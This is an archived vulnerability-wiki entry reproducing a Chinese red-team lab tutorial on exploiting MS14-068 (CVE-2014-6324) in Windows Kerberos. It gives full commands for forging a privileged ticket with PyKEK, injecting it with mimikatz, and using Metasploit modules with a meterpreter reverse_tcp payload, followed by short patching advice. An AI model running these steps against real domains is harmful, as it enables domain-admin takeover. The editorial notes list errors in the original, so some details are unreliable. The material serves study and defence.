---
cve: "CVE-2014-6324"
identifier_role: "primary"
primary_identifiers: "CVE-2014-6324"
referenced_identifiers: ""
identifier_status: "unknown"
title: "Kerberos 域用户提权漏洞（MS14-068）分析与防范"
product: "Windows Active Directory Kerberos KDC"
record_type: "analysis"
document_type: "Kerberos实验与工具使用教程"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "域用户有效凭证/SID、未修复KDC可达；示例Win7域成员，DC构建未列；票据注入与远程执行权限上下文需说明"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Windows/Kerberos%20%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88MS14-068%EF%BC%89%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E8%8C%83.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/T4HU6k10m4x5CLNuLuGrfQ"
id: "vw-0969e89db1664494cffa3ed0"
entity_id: "ve-0969e89db1664494cffa3ed0"
schema_version: "1"
---

# Kerberos 域用户提权漏洞（MS14-068）分析与防范

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Windows Active Directory Kerberos KDC
- 文献类型：Kerberos实验与工具使用教程
- 版本、权限及部署边界：域用户有效凭证/SID、未修复KDC可达；示例Win7域成员，DC构建未列；票据注入与远程执行权限上下文需说明
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 所有Windows服务器均受影响过宽，应限定有漏洞KDC版本/补丁状态；宿主shell是本文实验方式而非漏洞唯一前提
2. 根因概括为未验证签名过于粗略，应恢复PAC签名/校验和类型验证缺陷；多处将TGT称服务票据，需区分
3. 仅缺KB3011780不能证明当前未修复，要考虑累积/替代补丁；弱密码/杀软不代替KDC补丁
4. PyKEY应统一PyKEK；示例DC192.168.2.25而后psexec rhosts改.24需解释目标变化，bakcgroud等拼写清理
5. 与另一MS14-068文重叠但本篇独有Metasploit路径，保留作为关联工具变体；来源有微软公告和源码，截图未视检

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/T4HU6k10m4x5CLNuLuGrfQ>
- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
- 原文参考链接（未重新核验）：<https://github.com/mubix/pykek>
- 原文参考链接（未重新核验）：<https://technet.microsoft.com/library/security/ms14-068>
- 原文参考链接（未重新核验）：<https://github.com/MrWQ/vulnerability-paper>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/T4HU6k10m4x5CLNuLuGrfQ)

渗透攻击红队

一个专注于红队攻击的公众号

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/ed37905fc78cae29fdb39c3d2c48d5d2b9708c7e2c1a14f0b6077ed379265569.jpg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **36** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/4039fb7f6b146028699e705fb2ffb22604a0e5a568f044857cc4ec6a458cc007.gif)

简介

Kerberos 域用户提权漏洞（MS14-068，CVE-2014-6324），所有 Windows 服务器都会收到该漏洞影响。包括 Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2。

该漏洞可导致活动目录整体权限控制收到影响，允许攻击者将域内任意用户权限提升至域管理级别。

如果攻击者获取了域内任何一台计算机的 shell 权限，同时知道任意域用户的用户名、SID、密码，即可获取域管理员权限。

漏洞产生原理：用户在向 Kerberos 密钥分发中心（KDC）申请 TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而 KDC 在处理该票据时未验证票据的签名，那么，返给用户的 TGT 就使普通域用户拥有了域管理员权限。该用户可以将 TGT 发送到 KDC，KDC 的 TGS（票据授权服务）在验证了 TGT 后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。

**MS14-068**

**PyKEY 工具包**

PyKEY 是一个利用 Kerberos 协议进行渗透测试的工具包。

使用 PyKEY 可以生成一张高权限的服务票据，并通过 mimikatz 将服务票据注入内存。

运行环境 python2.7.

下载地址：https://github.com/mubix/pykek

#### 工具说明

ms14-068.py 是 PyKEY 工具包中的 MS14-068 漏洞利用脚本。 

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/f390539199e98edbdfe7c0a9d1aed9dd608e07b848c4a2df88c2d97c73eb13d8.png)

```
-u：用户名@域名
-s：用户SID
-d：域控制器地址
-p：明文密码
--rc4：在没有明文密码的情况下，通过NTLM Hash登录
```

#### 查看域控制器的补丁安装情况

微软针对 MS14-068 漏洞提供补丁为 KB3011780。输入命令查看补丁情况：

```
wmic qfe get hotfixid
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/cd0426a29e8c52186d80d5a5e3dd1310b09731a61d3761ce92c32ec0f0527968.png)

可以看到域控机器没有安装补丁。

#### 查看用户的 SID

以用户 mary 身份登录，输入命令查看 SID 为：S-1-5-21-1218902331-2157346161-1782232778-1124

```
whoami /user
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/289689688ab1c58cee2a53eba4edb9fe69394a1b8ef85db75b0d548fb05167d5.png)

还可以使用这条命令获取域内所有用户的 SID：

```
wmic useraccount get name,sid
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/ccced8295378dd67731822313d3c183be36873313fed9bcb7f601d8cbd758631.png)

#### 生成高权限票据

使用 PyKEY 生成高权限票据命令格式：

```
ms14-068.py -u 域成员@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码
```

域成员：mary

域名：god.org

mary 的 sid：S-1-5-21-1218902331-2157346161-1782232778-1124

域控制器地址：192.168.2.25

域成员 mary 的密码：admin!@#45

使用命令如下：

```
ms14-068.py -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.2.25 -p admin!@#45
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c66b470839f9c6bc8bfbf12e6126281eaeb40c18e5e121cdda49a9268b9ac9f7.png)

之后会在当前路径下生成一个名为 ：TGT_mary@god.org.ccache 的票据文件。

#### 查看注入前的权限

首先我们查看域控制器 C 盘的内容是看不了的：

```
dir \\OWA2010CN-God\c$
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/2d5752f005d139226eed21bfadd57aa52b4d4c93700e469252c8e8c3eaa3a5f5.png)

#### 清除内存中所有票据

如果目标主机上内存中有票据的话，我们需要把票据都清除：

```
kerberos::purge
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/2f449abc34f9643e591228e6c1877bcd7364264931503b035938dc8d7b45f060.png)

#### 将高权限票据注入内存

将票据文件复制到 Mary win7 的机器下的 mimikatz 目录下，使用 mimikatz 将票据注入内存：

```
kerberos::ptc "票据文件"
kerberos::ptc "TGT_mary@god.org.ccache"
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c73cf47e229cf956836fea2d7984b15d7eceac6336f56c6c7895d9399402bbe5.png)

显示 Injecting ticket：OK ，表示注入成功！

#### 验证权限

使用 dir 列出域控制器 C 盘的内容，这个时候就可以了：

```
dir \\OWA2010CN-God\c$
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/3eec9162a2a45c6d9927e090e45e08d0d3df92b91882e3f68c3b9b4dc244cf09.png)

**Metasploit 中进行测试**

在 MSF 中，也有一个针对 MS14-068 漏洞利用的模块：

```
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/21c7d4751cbcf3934adab6d3ed2065769798f0f19d3fbdd19bfd2533f475fe0a.png)

它只需要输入域名、被提权用户的密码、被提权用户、被提权用户的 SID，域控制器的 IP：

域成员：mary

域名：god.org

mary 的 sid：S-1-5-21-1218902331-2157346161-1782232778-1124

域控制器地址：192.168.2.25

域成员 mary 的密码：admin!@#45

```
set domain god.org
set password admin!@#45
set user mary
set user_sid S-1-5-21-1218902331-2157346161-1782232778-1124
set rhosts 192.168.2.25
run
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/f5db93787f2adbe173e89f9800a7d913c14d32854258c239c1c1b2460dd12f92.png)

运行之后，会在 /root/.msf4/loot 目录下 生成文件：20201110021544_default_192.168.2.25_windows.kerberos_988070.bin

接下来要进行格式转换，在 mimikatz 中输入命令，导出 kirbi 格式的文件：

```
kerberos::clist "20201110021544_default_192.168.2.25_windows.kerberos_988070.bin" /export
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/77132c41f1aefed432b7477461d254064377c16cc22768c4fc997716d7c316b9.png)

这个时候转换成了：0-00000000-mary@krbtgt-GOD.ORG.kirbi 文件，我移动到了 Kali 的 / root 目录下，一会好操作！

首先需要让域用户 mary win7 上线 MSF：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/6a85b4c5f974afc0a9c31525c2fd5472ec19009c5c9efcf6aee9b6f67e84976e.png)

输入 load kiwi 命令加载 mimikatz：

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/b9c269891c42078eefd3e248aef48ef663482be477c7f505f6caf3f6243b1601.png)

然后输入命令导入票据：

```
kerberos_ticket_use /root/0-00000000-mary@krbtgt-GOD.ORG.kirbi
```

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/7b4f42c8dc31db1d77d3ee517188dcd23471b12016526658848d3c42047e14bf.png)

之后切换后台 bakcgroud ，使用模块进行高权限票据提权：

```
use exploit/windows/local/current_user_psexec
set technique PSH
set rhosts 192.168.2.24
set payload windows/meterpreter/reverse_tcp
set session 4
run
```

**防范建议**

针对 Kerberos 域用户提权漏洞：  

开启 Windows update 功能，进行自动更新

手动下载补丁包进行修复：https://technet.microsoft.com/library/security/ms14-068

对域内账号进行控制，禁止使用弱口令、定期修改密码

在服务器上安装杀毒软件，及时更新病毒库


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/40aaad22af7f44171fc001f77fa3df3da580afe10e64b4cc679d75fa1c5f4216.png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/6000a3ad558dc18ae4b4980bde36eb585a8d9f3d666cc3abdead339eb8cffaab.jpg)

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/e95bab6e8a2e21887ae7bd2f4bf4109d6d4eab2f18fa7c6853fb9da8fa74d1b7.png)

点分享

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/b94311534c431311a6b30af2eb40adb7d08ac2cc847224be0eca88249eaeb004.png)

点点赞

![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/d8f09d4871dad8ed82fb357f065af25d92a2878593cdb206a4e08096012678cc.png)

点在看

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
